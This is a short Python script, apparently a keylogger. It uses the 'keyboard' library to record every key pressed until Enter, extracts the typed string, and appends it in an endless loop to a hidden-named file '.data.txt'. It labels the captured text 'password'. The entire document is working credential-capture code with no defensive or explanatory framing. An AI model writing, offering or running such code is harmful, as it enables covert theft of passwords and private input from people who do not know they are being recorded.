
import keyboard
path = ".data.txt"

while True:
    with open(path, 'a') as data_file:
        
        # All key presses are recorded as a list into "events" and the record loop stops when the "enter" key is pressed
        events = keyboard.record('enter')
        password = list(keyboard.get_typed_strings(events))
        
        data_file.write('\n') 
        data_file.write(password[0])